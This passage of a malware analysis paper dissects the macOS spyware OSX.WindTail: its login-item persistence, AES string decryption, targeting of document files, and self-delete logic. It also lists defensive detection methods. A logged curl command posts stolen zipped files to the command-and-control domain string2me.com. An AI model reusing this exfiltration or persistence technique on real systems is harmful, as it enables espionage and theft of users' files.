<p style="padding-left: 30px;"><em>Note: In his presentation, Karim stated: ‘The specially crafted web page will download a file, VVIP_Contacts.zip, and will call a URL scheme: openurl2622015’ [<a href="#ref1">1</a>]. Note that the custom URL scheme in the Final_Presentation sample closely ‘matches’ this.</em></p>
<p>Let’s now reverse the OSX.WindTail.A binary to uncover its method of persistence, capabilities and more!</p>
<p> </p>
<h3><a class="chapter" name="h3-osxwindtail-persistence"></a>OSX.WindTail: persistence</h3>
<p>In this part of the paper, we’ll analyse the method of persistence leveraged by OSX.WindTail to ensure it is automatically (re)started each time the infected user logs in.</p>
<p style="padding-left: 30px;"><em>Note: Here, and for the remainder of this paper, we’ll analyse the OSX.WindTail.A specimen ‘Final_Presentation’ application (SHA256: CEEBF77899D2676193DBB79E660AD62D97220FD0A54380804BC3737C77407D2F). Note that the other specimens found on VirusTotal (NPC_Agenda_230617, Scandal_Report_2017, etc.) are essentially identical.</em></p>
<p>Our examination of the malware begins in the ‘main’ function of the application’s binary (‘usrnode’):</p>
<pre>int main(int argv, char** argv) {<br />    r12 = [NSURL fileURLWithPath:[[NSBundle mainBundle] bundlePath]];<br />    rbx = LSSharedFileListCreate(0x0, _kLSSharedFileListSessionLoginItems,<br />                    0x0);<br />    LSSharedFileListInsertItemURL(rbx, _kLSSharedFileListItemLast, 0x0, 0x0,<br />                    r12, 0x0, 0x0);<br />    ...<br />    rax = NSApplicationMain(r15, r14);<br />    return rax;<br />}</pre>
<p>After resolving the path to itself, the malware invokes the ‘LSSharedFileListInsertItemURL’ API. This adds a login item, which is a mechanism to gain persistence and ensure that the (malicious) application will automatically be (re)started every time the user logs in. This persistence is visible via the System Preferences application.</p>
<p><img style="display: block; margin-left: auto; margin-right: auto;" src="/files/cache/febe395b1f20afacf00ce41727b69a6d_f4425.png" alt="figure13-loginItems.png" width="800" height="235" /></p>
<p class="centered-caption">Figure 13: Persistence of Final_Presentation is visible.</p>
<p>Clearly not the stealthiest persistence mechanism, but it suffices.</p>
<p> </p>
<h3><a class="chapter" name="h3-osxwindtail-installation"></a>OSX.WindTail: installation</h3>
<p>Once the malware has persisted, the code in the main function invokes the ‘NSApplicationMain’ function, which in turn invokes the ‘applicationDidFinishLaunching’ (delegate) method:</p>
<p style="padding-left: 30px;"><em>Note: The ‘applicationDidFinishLaunching’ method is invoked automatically ‘after the application has been launched and initialized’ [<a href="#ref5">5</a>]. Thus, when analysing malicious macOS applications, always investigate this method!</em></p>
<pre>-(void)applicationDidFinishLaunching:(void *)arg2 {<br />    r15 = self;<br />    r14 = [[NSDate alloc] init];<br />    rbx = [[NSDateFormatter alloc] init];<br />    [rbx setDateFormat:@"dd-MM-YYYYHH:mm:ss"];<br />    r14 = [[[[rbx stringFromDate:r14] componentsSeparatedByCharactersInSet:<br />        [NSCharacterSet characterSetWithCharactersInString:cfstring____]]<br />        componentsJoinedByString:@""] stringByReplacingOccurrencesOfString:@" "<br />        withString:@""];<br />    rcx = [[NSBundle mainBundle] resourcePath];<br />    rbx = [NSString stringWithFormat:@"%@/date.txt", rcx]; <br />    rax = [NSFileManager defaultManager];<br />    rdx = rbx;<br />    if ([rax fileExistsAtPath:rdx] == 0x0) {<br />        rax = arc4random();<br />        rax = [NSString stringWithFormat:@"%@%@", r14,<br />            [[NSNumber numberWithInt:rax - (rax * 0x51eb851f &gt;&gt; 0x25) * 0x64,<br />            (rax * 0x51eb851f &gt;&gt; 0x25) * 0x64] stringValue]];<br />        rcx = 0x1;<br />        r8 = 0x4;<br />        rdx = rbx;<br />        rax = [rax writeToFile:rdx atomically:rcx encoding:r8 error:&amp;var_28];<br />        if (rax == 0x0) {<br />            r8 = 0x4;<br />            rax = [NSUserDefaults standardUserDefaults];<br />            rcx = @"GenrateDeviceName";<br />            rdx = 0x1;<br />            [rax setBool:rdx forKey:rcx, r8];<br />            [[NSUserDefaults standardUserDefaults] synchronize];<br />        }<br />        }<br />        [r15 read];<br />        [r15 tuffel];<br />        [NSThread detachNewThreadSelector:@selector(mydel) toTarget:r15 withObject:<br />0x0];<br />        return;<br />}</pre>
<p>The code in the ‘applicationDidFinishLaunching’ delegate method performs the following:</p>
<ol>
<li>Generates the current date and time, saving it into a formatted string.</li>
<li>Builds a path to the date.txt, found within its application bundle (Contents/Resources/date.txt).</li>
<li>If this file doesn’t exist, it writes out the (formatted) date/time string and a random number.</li>
<li>If this fails, it sets the ‘GenrateDeviceName’ (sic) user default key to true.</li>
<li>Reads in the data from the date.txt file.</li>
<li>Invokes the ‘tuffel’ method.</li>
<li>Spawns a thread to execute the ‘mydel’ method.</li>
</ol>
<p>Steps 1-5 generate, and on subsequent executions (re)load, a unique identifier for the implant (e.g. 2012201800380925). This may be observed via <em>macOS</em>’s built-in fs_usage utility:</p>
<pre># fs_usage -w -filesystem | grep date.txt<br />    lstat64 /Users/user/Desktop/Final_Presentation.app/Contents/<br />    Resources/date.txt usrnode.8894<br />    open F=3 (R_____) /Users/user/Desktop/<br />    Final_Presentation.app/Contents/Resources/date.txt usrnode.8894<br />    ...<br />    # cat ~/Desktop/Final_Presentation.app/Contents/Resources/date.txt<br />    2012201800380925</pre>
<p style="padding-left: 30px;"><em>Note: Such a ‘per-implant’ identifier helps a remote attacker keep track (or organize) infected hosts.</em></p>
<p>Once this logic is completed, the ‘tuffel’ method is invoked to execute the main logic of the malware which includes:</p>
<ol>
<li>Installation</li>
<li>File collection and exfiltration</li>
</ol>
<p>Let’s take a closer look at both of these.</p>
<p>The install logic of the malware is (largely) handled by the ‘cp’ method. This method is invoked via the ‘init’ method of the ‘appdele’ class (which is invoked in the ‘tuffel’ method).</p>
<pre>/* @class appdele */<br />-(void)cp {<br />    r13 = self;<br />    var_30 = r13;<br />    *qword_100015f20 = [[NSFileManager alloc] init];<br />    r15 = [[NSBundle mainBundle] bundlePath];<br />    rbx = [r15 lastPathComponent];<br />    r12 = NSHomeDirectory();<br />    r8 = [r13 yoop:@"oX0s4Qj3GiAzAnOmzGqjOA=="];<br />    rcx = r12;<br />    rbx = [NSString stringWithFormat:@"%@%@%@%@", rcx, r8, @"/", rbx];<br />    ...<br />    if (([*qword_100015f20 copyItemAtPath:r15 toPath:rbx error:0x0] &amp; 0xff) == 0x1)<br />        goto loc_10000297b;<br />    ...</pre>
<p>In the ‘cp’ method, the malware constructs a path to its own application bundle via [[NSBundle mainBundle] bundlePath]. After retrieving the bundle’s name (via the ‘lastPathComponent’ method) the malware invokes the ‘NSHomeDirectory’ function to get the user’s home directory. And what about the encoded, encrypted string, ‘oX0s4Qj3GiAzAnOmzGqjOA==’? That decrypts to ‘/Library’.</p>
<p> </p>
<h3><a class="chapter" name="h3-osxwindtail-string-decryption"></a>OSX.WindTail: string decryption</h3>
<p>String decryption is handled via the ‘yoop’ method (which, in turn, invokes decoding and decryption helper methods):</p>
<pre>-(void *)yoop:(void *)arg2 {<br />    rax = [[[NSString alloc] initWithData:[[yu decode:arg2]<br />        AESDecryptWithPassphrase:cfstring__] encoding:0x1]<br />        stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];<br />    return rax;<br />}</pre>
<p>Looking closer at the call to the decryption method (‘AESDecryptWithPassphrase’) reveals the hard-coded AES decryption key:</p>
<pre>cfstring___100013480:<br />    0x000000010001c1a8, 0x00000000000007d0,<br />    0x000000010000bc2a, 0x0000000000000010 ; u"æ$&amp;łŁńŚŽ~Ę?|!~&lt;OE",</pre>
<p>This is the exact same key as Karim showed in his slides [<a href="#ref1">1</a>].</p>
<p><img class="framed" style="display: block; margin-left: auto; margin-right: auto;" src="/files/cache/a3f9acf9132f6fd931c317f35b13673c_f4426.png" alt="Figure14-keys.png" width="840" height="273" /> <span class="centered-caption">Figure 14: Karim showed the same key in his slides [<a href="#ref1">1</a>].</span></p>
<p>To dynamically observe string decryption, one can simply set a breakpoint within the ‘yoop’ method, and then dump the (now) decrypted strings. For example, as may be seen in the debugger output, the aforementioned string ‘oX0s4Qj3GiAzAnOmzGqjOA==’ decrypts to ‘/Library’.</p>
<pre>(lldb)<br />0x100002873 &lt;+125&gt;: movq 0x12bce(%rip), %rsi ; "yoop:"<br />0x10000287a &lt;+132&gt;: leaq 0x10ddf(%rip), %rdx ; @"oX0s4Qj3GiAzAnOmzGqjOA=="<br />0x100002881 &lt;+139&gt;: movq %r13, %rdi<br />0x100002884 &lt;+142&gt;: callq *%r14 ; objc_msgSend<br />...<br />//after stepping over callq *%r14 (objc_msgSend)<br />(lldb) po $rax<br />/Library</pre>
<p style="padding-left: 30px;"><em>Note: The x64 ABI for macOS dictates that the return value of a method or function is stored in the RAX register. In other words, once a method (or function) returns, it simply displays what’s in the RAX register to see what’s returned (e.g. the decrypted string).</em></p>
<p>Returning to the install logic in the ‘cp’ method, once string decryption has commenced, the malware builds a full path via the ‘stringWithFormat’ method. On an infected virtual machine, this produces</p>
<pre>(lldb) po $rdi<br />&lt;NSFileManager: 0x1001221e0&gt;<br />//method name<br />(lldb) x/s $rsi<br />0x7fff6cabf632: "copyItemAtPath:toPath:error:"<br />//source path<br />(lldb) po $rdx<br />/Users/user/Desktop/Final_Presentation.app<br />//destination path<br />(lldb) po $rcx<br />/Users/user/Library/Final_Presentation.app</pre>
<p>Or passively via <em>macOS</em>’s built-in file monitor utility, fs_usage:</p>
<pre># fs_usage -w -f filesystem | grep -i usrnode<br />open /Users/user/Desktop/Final_Presentation.app<br />mkdir /Users/user/Library/Final_Presentation.app<br />...</pre>
<p>Though the normal user is unlikely to be poking around in the ~/Library folder, if they did (and their <em>Mac</em> was infected with OSX.WindTail), the malware would be rather hard to miss, as shown in Figure 15.</p>
<p><img class="framed" style="display: block; margin-left: auto; margin-right: auto;" src="/files/1615/7614/8128/figure15-installed.png" alt="figure15-installed.png" width="735" height="621" /></p>
<p class="centered-caption">Figure 15: In the ~/Library folder the malware is hard to miss.</p>
<p>The malware then executes the installed copy via the ‘open’ command. This can be observed via the author’s open-source process monitor library, <em>ProcInfo</em> [<a href="#ref6">6</a>]:</p>
<pre># ./procInfo<br />[ process start]<br />pid: 917<br />path: /usr/bin/open<br />user: 501<br />args: (<br />    open,<br />    "-a",<br />    "/Users/user/Library/Final_Presentation.app"<br />)</pre>
<p>Recall that as soon as the malware (or its copy) is launched, it persists itself a login item. Amusingly, this means that both the original malware and its installed copy will both be persisted.</p>
<p><img style="display: block; margin-left: auto; margin-right: auto;" src="/files/5115/7614/8212/Figure16-persist.png" alt="Figure16-persist.png" width="668" height="486" /></p>
<p class="centered-caption">Figure 16: Both the original malware and its installed copy will be persisted.</p>
<p> </p>
<h3><a class="chapter" name="h3-osxwindtail-payload"></a>OSX.WindTail: payload</h3>
<p>At this point the malware has been installed and persisted (twice). But the question remains, what does the malware actually do?</p>
<p>Via the ‘init’ method of ‘appdele’ (recall, invoked via the ‘tuffel’ method), the malware invokes a method named ‘yan’.</p>
<pre>/* @class appdele */<br />-(void *)yan {<br />    var_30 = [self yoop:@"BouCfWujdfbAUfCos/iIOg=="];<br />    [self yoop:@"Bk0WPpt0IFFT30CP6ci9jg=="];<br />    [self yoop:@"RYfzGQY52uA9SnTjDWCugw=="];<br />    [self yoop:@"XCrcQ4M8lnb1sJJo7zuLmQ=="];<br />    [self yoop:@"3J1OfDEiMfxgQVZur/neGQ=="];<br />    [self yoop:@"Nxv5JOV6nsvg/lfNuk3rWw=="];<br />    [self yoop:@"Es1qIvgb4wmPAWwlagmNYQ=="];<br />    [self yoop:@"eOA0XJNs/eeFUVMThfZjTA=="];<br />    [self yoop:@"B/9RICA+yl4vZrIeyON8cQ=="];<br />    [self yoop:@"B8fvRmZ1LJ74Q5OiD9KISw=="];<br />    rax = [NSMutableArray arrayWithObjects:var_30];<br />    return rax;<br />}</pre>
<p>Via calls to the string decryption method ‘yop’, the ‘yan’ method appears to return an array of the decrypted strings. A debugger can be used to decrypt theses strings. Specifically, one can set a breakpoint on the method (address: 0x000000010000238b). Once this breakpoint is hit, executing lldb’s ‘finish’ command will execute the entire method, then stop as soon as it returns. Now, a pointer to the array of decrypted strings (that appear to be file extensions) will be held in the RAX register.</p>
<pre>(lldb) b 0x000000010000238b<br />(lldb) c<br />...<br />-&gt;    0x10000238b &lt;+0&gt;: pushq %rbp<br />    0x10000238c &lt;+1&gt;: movq %rsp, %rbp<br />    0x10000238f &lt;+4&gt;: pushq %r15<br />    0x100002391 &lt;+6&gt;: pushq %r14<br />(lldb) finish<br />(lldb) po $rax<br />&lt;__NSArrayM 0x10018f920&gt;(<br />doc, docx, ppt, pdf, xls,<br />xlsx, db, txt, rtf, pptx)</pre>
<p>Another interesting method is named ‘fist’ (invoked via the ‘df’ method, which is scheduled via an NSTimer).</p>
<p>The ‘fist’ method is rather large, but perusing its decompilation reveals the invocation of <em>Apple</em> APIs such as ‘contentsOfDirectoryAtPath’, ‘pathExtension’, and (string) comparisons. It seems reasonable to assume it is enumerating files, perhaps looking for files that match the previously decrypted file extensions.</p>
<p>Setting various breakpoints within the ‘fist’ method reveals the malware first enumerating and building a list of directories:</p>
<pre>(lldb) po $rdi<br />&lt;__NSArrayM 0x10018e360&gt;(<br />/Library,<br />/net,<br />/Network,<br />/private,<br />/sbin,<br />/System,<br />/Users,<br />/usr,<br />/vm,<br />/Volumes,<br />/Applications/App Store.app,<br />/Applications/Automator.app,<br />/Applications/Calculator.app,<br />/Applications/Calendar.app,<br />/Applications/Chess.app,<br />/Applications/Contacts.app,<br />/Applications/Dashboard.app,<br />/Applications/Dictionary.app,<br />/Applications/DVD Player.app,<br />...</pre>
<p>The malware then adds files that match the (previously) decrypted file extensions (doc, db, rtf, etc.) to an array (named ‘honk’):</p>
<pre>(lldb) po $rdx<br />&lt;__NSArrayM 0x1001aafc0&gt;(<br />{<br />    "KEY_ATTR" = {<br />        NSFileCreationDate = "2017-09-26 06:58:34 +0000";<br />        NSFileExtensionHidden = 0;<br />        NSFileGroupOwnerAccountID = 0;<br />        NSFileGroupOwnerAccountName = wheel;<br />        NSFileHFSCreatorCode = 0;<br />        NSFileHFSTypeCode = 0;<br />        NSFileModificationDate = "2017-09-26 07:01:34 +0000";<br />        NSFileOwnerAccountID = 0;<br />        NSFileOwnerAccountName = root;<br />        NSFilePosixPermissions = 420;<br />        NSFileReferenceCount = 1;<br />        NSFileSize = 57344;<br />        NSFileSystemFileNumber = 890895;<br />        NSFileSystemNumber = 16777218;<br />        NSFileType = NSFileTypeRegular;<br />    };<br />    "KEY_PATH" = "/Library/Application Support/com.apple.TCC/TCC.db";<br />},<br />{<br />    "KEY_ATTR" = {<br />        NSFileCreationDate = "2017-07-15 23:45:04 +0000";<br />        NSFileExtensionHidden = 0;<br />        NSFileGroupOwnerAccountID = 0;<br />        NSFileGroupOwnerAccountName = wheel;<br />        NSFileHFSCreatorCode = 0;<br />        NSFileHFSTypeCode = 0;<br />        NSFileModificationDate = "2017-07-15 23:45:04 +0000";<br />        NSFileOwnerAccountID = 0;<br />        NSFileOwnerAccountName = root;<br />        NSFilePosixPermissions = 384;<br />        NSFileReferenceCount = 1;<br />        NSFileSize = 272;<br />        NSFileSystemFileNumber = 869137;<br />        NSFileSystemNumber = 16777218;<br />        NSFileType = NSFileTypeRegular;<br />    };<br />    "KEY_PATH" = "/private/etc/racoon/psk.txt";<br />}<br />)</pre>
<p>For each of the files that the ‘fist’ method added to the ‘honk’ array, the malware invokes a method, aptly named ‘zip’, and invokes <em>macOS</em>’s built-in zip utility to create an archive of the file:</p>
<pre>/* @class image */<br />-(void)zip {<br />    r14 = [@"/tmp/" stringByAppendingPathComponent:[rbx-&gt;m_filePath<br />            lastPathComponent]];<br />        ...<br />    rax = [r14 stringByAppendingString:@".zip"];<br />    ...<br />    rax = (r14)(@class(NSArray), @selector(arrayWithObjects:), @"/usr/bin/zip",<br />    *(rbx + r12), rbx-&gt;m_filePath, 0x0);<br />    rax = (r14)(r15, @selector(initWithController:arguments:), rbx, rax);<br />    *(rbx + r13) = rax;<br />    (r14)(rax, @selector(startProcess), rbx);<br />    return;<br />}</pre>
<p>This may be passively observed via the <em>ProcInfo</em> [<a href="#ref6">6</a>] process monitoring utility (here, for example, the zip archive is created from the file StopTemplate.pdf):</p>
<pre># ./procInfo<br />[ process start]<br />pid: 1202<br />path: /usr/bin/zip<br />args: (<br />    "/usr/bin/zip",<br />    "/tmp/StopTemplate.pdf.zip",<br />    "/Applications/Automator.app/Contents/Resources/StopTemplate.pdf"<br />)</pre>
<p>Once the file has been zipped up the malware invokes a method named ‘upload’:</p>
<pre>/* @class image */<br />-(void)upload {<br />    ...<br />    r14 = [tofg alloc];<br />    if (r12-&gt;m_State == 0x1) {<br />        var_30 = [@"<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="81f7e0f2f5bcc1">[email&#160;protected]</a>" stringByAppendingString:r12-&gt;m_tempPath]; <br />        [@"od=" stringByAppendingString:r12-&gt;m_ComputerName_UserName]; <br />        [@"kl=" stringByAppendingString:r12-&gt;cont];<br />        r8 = var_30;<br />        rax = [NSArray arrayWithObjects:@"/usr/bin/curl"]; rdx = r12;<br />        rax = [r14 initWithController:rdx arguments:rax]; }<br />    else {<br />        rax = [NSArray arrayWithObjects:@"/usr/bin/curl"]; rcx = rax;<br />        rax = [r14 initWithController:rdx arguments:rcx];<br />    }<br />    [rax startProcess];<br />    return;<br />}</pre>
<p>References to ‘curl’ (/usr/bin/curl) in this method illustrate that the malware is exfiltrating the files by (ab)using this built-in network utility. This can be confirmed via <em>ProcInfo</em> [<a href="#ref6">6</a>] (which also reveals the network endpoint ‘string2me.com/qgHUDRZiYhOqQiN/kESklNvxsNZQcPl.php’):</p>
<pre># ./procInfo<br />[ process start]<br />pid: 1258<br />path: /usr/bin/curl<br />user: 501<br />args: (<br />    "/usr/bin/curl",<br />    "-F",<br />    "<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="10667163642d50">[email&#160;protected]</a>/tmp/StopTemplate.pdf.zip",<br />    "-F",<br />    "od=1601201920543863",<br />    "-F",<br />    "kl=users-mac.lan-user",<br />    "string2me.com/qgHUDRZiYhOqQiN/kESklNvxsNZQcPl.php"<br />)</pre>
<p>The man page for curl states that the ‘-F’ flag will post data, and when ‘@’ is specified, curl will process the input as a file:</p>
<pre>$ man curl<br />...<br />-F, --form &lt;name=content&gt;<br />(HTTP) This lets curl emulate a filled-in form in which a user has pressed the submit button. This causes curl to POST data using the Content-Type multipart/formdata according to RFC 2388. This enables uploading of binary files etc. To force the 'content' part to be a file, prefix the file name with an @ sign. To just get the content part from a file, prefix the file name with the symbol &lt;. The difference between @ and &lt; is then that @ makes a file get attached in the post as a file upload, while the &lt; makes a text field and just get the contents for that text field from a file.<br />Example: to send an image to a server, where 'profile' is the name of the formfield to which portrait.jpg will be the input:curl -F <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="9ceceef3faf5f0f9a1dcecf3eee8eefdf5e8b2f6ecfb">[email&#160;protected]</a><br />https://example.com/upload.cgi</pre>
<p>A <em>Wireshark</em> [<a href="#ref7">7</a>] capture also illustrates the exfiltration attempt to string2me.com (though the C&amp;C server returned a 403 error), as shown in Figure 17.</p>
<p><img class="framed" style="display: block; margin-left: auto; margin-right: auto;" src="/files/cache/9f1561eba2d837073d280eab2863c199_f4429.png" alt="Figure17-curl.png" width="840" height="493" /></p>
<p class="centered-caption">Figure 17: Exfiltration to string2me.com is attempted.</p>
<p>Through static and dynamic analysis, we illustrated OSX.WindTail’s ultimate goal: to persistently exfiltrate files (such as documents) to a remote server. This capability fits nicely into an offensive cyber-espionage operation, such as the one orchestrated by the WINDSHIFT APT group.</p>
<p> </p>
<h3><a class="chapter" name="h3-osxwindtail-campc-servers"></a>OSX.WindTail: C&amp;C servers</h3>
<p>As noted, <em>ProcInfo</em> [<a href="#ref6">6</a>] and <em>Wireshark</em> observed the malware invoking curl to exfiltrate files to its command-and-control server, string2me.com.</p>
<p>However this string does not appear in plaintext in the malware’s binary:</p>
<pre># grep string2me.com Final_Presentation.app/Contents/MacOS/usrnode | wc<br />0 0 0</pre>
<p>This is unsurprising as malware authors often obfuscate or encrypt such strings to hinder analysis.</p>
<p>Recall that the malware invokes the ‘yoop’ method to decrypt embedded strings. By setting a breakpoint on this method, one can observe the malware dynamically decrypting and decoding strings.</p>
<p>For example, the malware’s ‘mydel’ method appears to attempt to connect to the attacker’s C&amp;C servers. By waiting until (a debugged instance of) the malware invokes this method, the addresses of the C&amp;C servers can be recovered:</p>
<pre>(lldb) x/s 0x0000000100350a40<br />0x100350a40: "string2me.com/qgHUDRZiYhOqQiN/kESklNvxsNZQcPl.php<br />...<br />(lldb) x/s 0x0000000100352fe0<br />0x100352fe0: "http://flux2key.com/liaROelcOeVvfjN/fsfSQNrIyxeRvXH.php?<br />very=%@&amp;xnvk=%@</pre>
<p>These C&amp;C domains (string2me.com and flux2key.com) are both WINDSHIFT domains, as noted by Karim in an interview with <em>iTWire</em> [<a href="#ref8">8</a>]: ‘... the domains string2me.com and flux2key.com identified as associated with these attacks.’</p>
<p style="padding-left: 30px;"><em>Note: Currently both C&amp;C servers appear to be offline:</em></p>
<p style="padding-left: 30px;"><em>$ ping flux2key.com<br />ping: cannot resolve flux2key.com: Unknown host<br />$ nslookup flux2key.com<br />Server: 8.8.8.8<br />Address: 8.8.8.8#53<br />** server can’t find flux2key.com: SERVFAIL<br /><br /></em></p>
<h3><a class="chapter" name="h3-osxwindtail-self-delete-logic"></a>OSX.WindTail: self-delete logic</h3>
<p>Let’s briefly revisit the malware’s implementation of the ‘applicationDidFinishLaunching’ delegate method:</p>
<pre>-(void)applicationDidFinishLaunching:(void *)arg2<br />{<br />    ...<br />    [r15 tuffel];<br />    [NSThread detachNewThreadSelector:@selector(mydel) toTarget:r15 withObject:0x0];<br />}</pre>
<p>Note that at the end, the malware spins off a new thread (via the ‘detachNewThreadSelector’ method) to execute a method named ‘mydel’.</p>
<pre>/* @class AppDelegate */<br />-(void)mydel {<br />    ...<br />    r14 = [NSString stringWithFormat:@"%@", [self yoop:@"F5Ur0CCFMO/<br />    fWHjecxEqGLy/..."]];<br />    rbx = [[NSMutableURLRequest alloc] init];<br />    [rbx setURL:[NSURL URLWithString:r14]];<br />    ...<br />    if ([[[NSString alloc] initWithData:[NSURLConnection sendSynchronousRequest:rbx<br />        returningResponse:0x0 error:0x0] encoding:0x4] isEqualToString:@"1"] != 0x0) {<br />            r14 = [NSFileManager defaultManager];<br />            rdx = [[NSBundle mainBundle] bundlePath];<br />            [r14 removeItemAtPath:rdx error:rcx];<br />            [[NSApplication sharedApplication] terminate:0x0, rcx];<br />    }<br />    return;<br />}</pre>
<p>As shown in the above decompilation, the ‘mydel’ method performs the following:</p>
<ol>
<li>Generates a URL request from an encrypted string.</li>
<li>Makes a network request to this URL</li>
<li>If the request returns a string that equals ‘1’:</li>
<li>Deletes itself</li>
<li>Terminates itself</li>
</ol>
<p style="padding-left: 30px;"><em>Note: The encrypted string decrypts to a URL: http://flux2key.com/liaROelcOeVvfjN/fsfSQNrIyxeRvXH.php?very=%@&amp;xnvk=%@</em></p>
<p>Though this C&amp;C server was offline at the time of analysis, if the server returns a ‘1’ the malware will delete itself and then immediately terminate. It’s rather neat to see a ‘remotely triggerable’ self-deletion capability built directly into the malware!</p>
<p> </p>
<h3><a class="chapter" name="h3-osxwindtail-detection"></a>OSX.WindTail: detection</h3>
<p>When OSX.WindTail samples were submitted to <em>VirusTotal</em>, many of the specimens were initially undetected, as shown in Figure 18.</p>
<p><a class="zoom-img" title="Figure 18: Most samples were initially undetected." href="/files/6815/7614/9365/figure18-similarities_-_Copy.png"><img class="framed" style="display: block; margin-left: auto; margin-right: auto;" src="/files/cache/e95554d039bc670b9efa305f2d317e16_f4430.png" alt="figure18-similarities - Copy.png" width="840" height="325" /></a><span class="centered-caption">Figure 18: Most samples were initially undetected.</span></p>
<p style="padding-left: 30px;"><em>Note: It should be noted that for any particular AV engine (on VirusTotal), said engine may only be one (small?) piece of a more complete security product. That is to say, a company’s comprehensive security product may also include a behaviour-based engine (not included on VirusTotal) that perhaps could generically detect this new threat.</em></p>
<p>Although OSX.WindTail is utilized by a fairly advanced APT group, in reality it is rather easy to detect, albeit via heuristics.</p>
<p>For example, by monitoring persistence events (such the programmatic installation of a login item) one may be able to detect the malware during its installation and persistence phase. In Figure 19, <em>BlockBlock</em> [<a href="#ref9">9</a>] detects OSX.WindTail’s persistence.</p>
<p><img style="display: block; margin-left: auto; margin-right: auto;" src="/files/cache/d37bf8c91efe4c1ae069b220d5eeb769_f4431.png" alt="Figure19-blockBlock.png" width="840" height="399" /> <span class="centered-caption">Figure 19: BlockBlock proactively detects OSX.WindTail.</span></p>
<p>Of course, a firewall product such as the free, open-source <em>LuLu</em> [<a href="#ref10">10</a>] would be able to detect the malware’s unauthorized network connections (e.g. to its C&amp;C server).</p>
<p>On a system that has been infected, a tool such as <em>KnockKnock</em> [<a href="#ref11">11</a>], that enumerates persistently installed software, can generically detect OSX.WindTail (and other persistence threats as well), as shown in Figure 20.</p>
<p><img style="display: block; margin-left: auto; margin-right: auto;" src="/files/cache/df687d6a26126a0a5a8b6aed7bd64380_f4432.png" alt="figure20-knockKnock.png" width="840" height="317" /> <span class="centered-caption">Figure 20: KnockKnock reactively detects OSX.WindTail.</span></p>
<p>One can also manually check for an infection by looking for a suspicious login item via the <em>System Preferences</em> application, and/or for the presence of suspicious application in the ‘~/Library/’ folder (probably with a <em>Microsoft Office</em> icon, and perhaps an invalid code signature). Deleting any such applications and login item will remove the malware.</p>
<p style="padding-left: 30px;"><em>Note: If an infection is uncovered (which is rather unlikely, unless you’re a government official in a specific Middle Eastern country), as is the case with any malware infection, it’s best to fully wipe your system and reinstall macOS.</em></p>
<p> </p>
<h2><a class="chapter" name="h2-conclusion"></a>Conclusion</h2>
<p>It’s not every day that the <em>Mac</em> capabilities of an APT or ‘nation-state’ group are uncovered. However, OSX.WindTail (belonging to the WINDSHIFT APT group) provided an interesting case study of such a tool.</p>
<p>In this paper, we comprehensively analysed OSX.WindTail, detailing its exploit vector, installation logic, method of persistence, and file extfiltration capabilities. Moreover, our research discussed decryption routines to uncover addresses of the malware’s C&amp;C servers and highlighted its remote self-delete logic.</p>
<p>To conclude, we presented heuristic methods of detection that can generically detect OSX.WindTail, as well as other advanced macOS threats. Our hope is that such detection methods will become more widely and generically adopted in security tools and thus, that <em>Mac</em> users will remain safe and secure.</p>
<p> </p>
<h2><a class="chapter" name="h2-references"></a>References</h2>
<p><a class=" anchor" name="ref1"></a>[1] Karm, T. In the Trails of WindShift APT. Hack in the Box GSEC. <a href="https://gsec.hitb.org/materials/sg2018/D1%20COMMSEC%20-%20In%20the%20Trails%20of%20WINDSHIFT%20APT%20-%20Taha%20Karim.pdf" target="_blank">https://gsec.hitb.org/materials/sg2018/D1%20COMMSEC%20-%20In%20the%20Trails%20of%20WINDSHIFT%20APT%20-%20Taha%20Karim.pdf</a>.</p>
<p><a class=" anchor" name="ref2"></a>[2] Brewster, T. Hackers Are Exposing An Apple Mac Weakness In Middle East Espionage. Forbes. August 2018. <a href="https://www.forbes.com/sites/thomasbrewster/2018/08/30/apple-mac-loophole-breached-in-middle-east-hacks/#36d3c3b06fd6" target="_blank">https://www.forbes.com/sites/thomasbrewster/2018/08/30/apple-mac-loophole-breached-in-middle-east-hacks/#36d3c3b06fd6</a>.</p>
<p><a class=" anchor" name="ref3"></a>[3] Wardle, P. Click File, App Opens. Objective-See. August 2016. <a href="https://objective-see.com/blog/blog_0x12.html" target="_blank">https://objective-see.com/blog/blog_0x12.html</a>.</p>
<p><a class=" anchor" name="ref4"></a>[4] Apple Developer Documentation. Information Property List Key Reference. <a href="https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Articles/CoreFoundationKeys" target="_blank">https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Articles/CoreFoundationKeys</a>.<a href="%20html#//apple_ref/doc/uid/20001431-101685" target="_blank"> html#//apple_ref/doc/uid/20001431-101685</a>.</p>
<p><a class=" anchor" name="ref5"></a>[5] Apple Developer Documentation. applicationDidFinishLaunching:. <a href="https://developer.apple.com/documentation/appkit/nsapplicationdelegate/1428385-applicationdidfinishlaunching?language=objc" target="_blank">https://developer.apple.com/documentation/appkit/nsapplicationdelegate/1428385-applicationdidfinishlaunching?language=objc</a>.</p>
<p><a class=" anchor" name="ref6"></a>[6] ProcInfo, Process Monitor. <a href="https://github.com/objective-see/ProcInfo/tree/master/procInfo" target="_blank">https://github.com/objective-see/ProcInfo/tree/master/procInfo</a>.</p>
<p><a class=" anchor" name="ref7"></a>[7] WireShark. <a href="https://www.wireshark.org/" target="_blank">https://www.wireshark.org/</a>.</p>
<p><a class=" anchor" name="ref8"></a>[8] Varghese, S. Researcher unsure if Apple has acted to curb malware. iTWire. September 2018. <a href="https://www.itwire.com/security/84324-researcher-unsure-if-apple-has-actedto-curb-malware.html" target="_blank">https://www.itwire.com/security/84324-researcher-unsure-if-apple-has-actedto-curb-malware.html</a>.</p>
<p><a class=" anchor" name="ref9"></a>[9] BlockBlock. <a href="https://objective-see.com/products/blockblock.html" target="_blank">https://objective-see.com/products/blockblock.html</a>.</p>
<p><a class=" anchor" name="ref10"></a>[10] LuLu. <a href="https://objective-see.com/products/lulu.html" target="_blank">https://objective-see.com/products/lulu.html</a>.</p>
<p><a class=" anchor" name="ref11"></a>[11] KnockKnock. <a href="https://objective-see.com/products/knockknock.html" target="_blank">https://objective-see.com/products/knockknock.html</a>.</p> </div>
<div class="col-md-3 col-sm-3 col-lg-3">
<p><a href="/uploads/pdf/magazine/2019/VB2019-Wardle.pdf" target="_blank"><img src="/uploads/images/buttons/pdf-download-button.jpg" alt="Download PDF" width="262" height="45" /></a></p>
